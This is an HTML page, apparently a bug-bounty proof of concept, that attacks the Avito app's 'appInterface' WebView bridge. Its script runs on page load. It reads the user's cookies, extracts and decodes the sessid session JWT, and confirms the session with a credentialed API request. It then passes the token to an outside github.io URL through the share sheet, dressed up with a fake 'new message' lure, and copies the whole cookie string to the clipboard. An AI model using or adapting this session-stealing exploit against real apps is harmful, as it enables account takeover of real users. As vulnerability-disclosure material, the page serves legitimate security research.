<!DOCTYPE html>
<html>
<head><title>Avito Support</title>
<style>
  body { font-family: monospace; padding: 20px; background: #fff; }
  pre { background: #f0f0f0; padding: 10px; word-break: break-all; font-size: 12px; }
  .ok { color: green; font-weight: bold; font-size: 16px; }
  .err { color: red; }
</style>
</head>
<body>
<h2>appInterface PoC</h2>
<div id="out">Loading...</div>
<script>
window.onload = function() {
  var out = document.getElementById('out');
  var log = function(html) { out.innerHTML += html + '<br>'; };

  // 1. Показываем cookies
  var cookie = document.cookie;
  var m = cookie.match(/sessid=([^;]+)/);
  var sessid = m ? m[1] : null;

  log('<b>document.cookie length:</b> ' + cookie.length + ' bytes');

  if (!sessid) {
    log('<span class="err">sessid NOT FOUND in cookies</span>');
    return;
  }

  // 2. Декодируем JWT payload прямо на экране
  try {
    var parts = sessid.split('.');
    var payload = JSON.parse(atob(parts[1]));
    log('<span class="ok">JWT DECODED:</span>');
    log('<pre>' + JSON.stringify(payload, null, 2) + '</pre>');
    // payload.u = user_id, payload.exp = expiry
  } catch(e) {
    log('<span class="err">JWT decode error: ' + e + '</span>');
  }

  // 3. Живой API-запрос — показывает что сессия рабочая
  fetch('/api/1/notifications/count', { credentials: 'include' })
    .then(function(r) { return r.json(); })
    .then(function(d) {
      log('<span class="ok">API /notifications/count → ' + JSON.stringify(d) + '</span>');
    })
    .catch(function(e) {
      log('<span class="err">API error: ' + e + '</span>');
    });

  // 4. share sheet с токеном
  if (window.appInterface) {
    log('<b>appInterface.share() triggered</b>');
    window.appInterface.share(
      'Avito – у вас новое сообщение',
      'Проверьте объявление',
      'https://voborgus.github.io/bb-poc-repo/?s=' + encodeURIComponent(sessid)
    );
    window.appInterface.copy(cookie);
    log('<b>appInterface.copy() — ' + cookie.length + ' bytes to clipboard</b>');
  } else {
    log('<span class="err">appInterface NOT FOUND</span>');
  }
};
</script>
</body>
</html>
